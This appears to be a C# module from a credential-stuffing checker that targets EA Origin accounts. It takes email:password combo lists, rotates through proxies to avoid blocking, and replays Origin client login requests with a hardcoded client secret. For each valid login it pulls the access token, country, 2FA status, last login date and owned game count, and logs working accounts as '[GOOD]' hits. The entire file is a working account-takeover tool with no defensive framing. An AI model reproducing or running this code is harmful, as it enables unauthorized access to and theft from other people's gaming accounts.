using System;
using System.Drawing;
using System.Linq;
using System.Text.RegularExpressions;
using Colorful;
using Leaf.xNet;

namespace TPS
{
	internal class origin
	{
		public static void originStart()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = Program.var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.UserAgent = "Mozilla/5.0 EA Download Manager Origin/10.5.45.29542";
				httpRequest.ConnectTimeout = 10000;
				httpRequest.AllowAutoRedirect = true;
				HttpResponse httpResponse = httpRequest.Get("https://accounts.ea.com/connect/auth?client_id=ORIGIN_PC&response_type=code%20id_token&redirect_uri=qrc:///html/login_successful.html&display=originX/login&locale=en_US&nonce=306&pc_sign=eyJtaWQiOiAiMTUwMDE1NDEwNzE2NzA2Mjc4NzYiLCJic24iOiAiSDhOMENYMTcyOTc0MzQ4IiwibXNuIjogIkJTTjEyMzQ1Njc4OTAxMjM0NTY3IiwiaHNuIjogIkpBMTAwOUQ5MFBLNUJQIiwiZ2lkIjogIjU2NTQiLCJtYWMiOiAiJDAwZmYwMDU5MTY3MiIsInRzIjogIjIwMTktMDgtMjcgMjM6NTk6Mjg6Mjc3IiwiYXYiOiAidjEiLCJzdiI6ICJ2MiJ9.-rfWZCxkeqAO1c3RfmfiyeSc_lkjs1jmhCAOMLANWOY");
				httpRequest.IgnoreProtocolErrors = true;
				string address = httpResponse["SelfLocation"];
				string text5 = httpRequest.Post(address, "email=" + text + "&password=" + text2 + "&_eventId=submit&cid=6beCmB9ucTISOiFl2iTqx0IDZTklkePP&showAgeUp=true&googleCaptchaResponse=&_rememberMe=on&_loginInvisible=on", "application/x-www-form-urlencoded").ToString();
				if (text5.Contains("latestSuccessLogin"))
				{
					Match match = Regex.Match(text5, "fid=(.*?)\"");
					httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.8.0 Chrome/53.0.2785.148 Safari/537.36 EA Download Manager Origin/10.5.37.24524");
					httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
					httpRequest.AddHeader("Host", "accounts.ea.com");
					httpRequest.AddHeader("Connection", "keep-alive");
					HttpResponse httpResponse2 = httpRequest.Get("https://accounts.ea.com/connect/auth?client_id=ORIGIN_PC&response_type=code+id_token&redirect_uri=qrc%3A%2F%2F%2Fhtml%2Flogin_successful.html&display=originX%2Flogin&locale=en_US&nonce=1256&pc_machine_id=15173374696391813834&fid=" + match.Groups[1].Value);
					string input = httpResponse2["Location"];
					Match match2 = Regex.Match(input, "code=(.*?)&");
					httpRequest.AddHeader("Host", "signin.ea.com:443");
					httpRequest.AddHeader("Connection", "keep-alive");
					httpRequest.AddHeader("User-Agent", "Mozilla/5.0 EA Download Manager Origin/10.5.45.29542");
					httpRequest.AddHeader("X-Origin-UID", "17524622993368447356");
					httpRequest.AddHeader("X-Origin-Platform", "PCWIN");
					httpRequest.AddHeader("localeInfo", "en_US");
					httpRequest.AddHeader("Accept-Language", "en_US");
					string input2 = httpRequest.Post("https://accounts.ea.com/connect/token", string.Concat(new string[3]
					{
						"grant_type=authorization_code&code=",
						match2.Groups[1].Value,
						"&client_id=ORIGIN_PC&client_secret=UIY8dwqhi786T78ya8Kna78akjcp0s&redirect_uri=qrc:///html/login_successful.html"
					}), "application/x-www-form-urlencoded").ToString();
					Match match3 = Regex.Match(input2, "access_token\" : \"(.*?)\"");
					httpRequest.AddHeader("Authorization", "Bearer " + match3.Groups[1].Value);
					httpRequest.AddHeader("X-Include-Underage", "true");
					httpRequest.AddHeader("X-Extended-Pids", "true");
					string text6 = httpRequest.Get("https://gateway.ea.com/proxy/identity/pids/me").ToString();
					Regex.Match(text6, "dob\" : \"(.*?)\"");
					Match match4 = Regex.Match(text6, "country\" : \"(.*?)\"");
					Regex.Match(text6, "language\" : \"(.*?)\"");
					Match match5 = Regex.Match(text6, "pidId\" : (.*?),");
					Regex.Match(text6, "dateCreated\" : \"(.*?)\"");
					Regex.Match(text6, "dateModified\" : \"(.*?)\"");
					Match match6 = Regex.Match(text6, "lastAuthDate\" : \"(.*?)\"");
					Match match7 = Regex.Match(text6, "emailStatus\" : \"(.*?)\"");
					string text7 = Convert.ToString(1);
					text7 = ((!text6.Contains("tfaEnabled\" : false")) ? "True" : "False");
					httpRequest.AddHeader("User-Agent", "Mozilla/5.0 EA Download Manager Origin/10.5.37.24524");
					httpRequest.AddHeader("Accept", "application/vnd.origin.v2+json");
					httpRequest.AddHeader("Cache-Control", "no-cache");
					httpRequest.AddHeader("AuthToken", match3.Groups[1].Value);
					httpRequest.AddHeader("X-Origin-UID", "17524622993368447356");
					httpRequest.AddHeader("X-Origin-Platform", "PCWIN");
					httpRequest.AddHeader("localeInfo", "en_US");
					httpRequest.AddHeader("Accept-Language", "en-US");
					httpRequest.AddHeader("Connection", "Keep-Alive");
					httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
					httpRequest.AddHeader("Host", "api1.origin.com");
					string input3 = httpRequest.Get("https://api1.origin.com/ecommerce2/basegames/" + match5.Groups[1].Value + "?machine_hash=17524622993368447356").ToString();
					MatchCollection matchCollection = Regex.Matches(input3, "\"offerPath\" : \"\\/(.*?)\"");
					int num = matchCollection.Count - 1;
					int num2 = 0;
					while (true)
					{
						int num3 = num2;
						int num4 = num;
						if (num3 > num4)
						{
							break;
						}
						num2++;
					}
					Program.Combos.Results(text3 + " | Email status: " + match7.Groups[1].Value + " | Country: " + match4.Groups[1].Value + " | 2FA: " + text7 + " | Last login: " + match6.Groups[1].Value + " | Games: " + Convert.ToString(matchCollection.Count), "Hits", "Origin");
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
					Colorful.Console.WriteLine("[GOOD] " + text3 + " | Email status: " + match7.Groups[1].Value + " | Country: " + match4.Groups[1].Value + " | 2FA: " + text7 + " | Last login: " + match6.Groups[1].Value + " | Games: " + Convert.ToString(matchCollection.Count), Color.Green);
				}
				else if (text5.Contains("We're sorry, but we're having some technical difficulties"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("Two Factor Log In"))
				{
					Colorful.Console.WriteLine("[2FA] " + text3, Color.Yellow);
					Program.Combos.Results(text3, "2FA", "Origin");
					Checker.Increment_CPM++;
					Variables.Progress++;
				}
				else if (text5.Contains("Your credentials are incorrect or have expired"))
				{
					if (Program.ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
			}
		}
	}
}
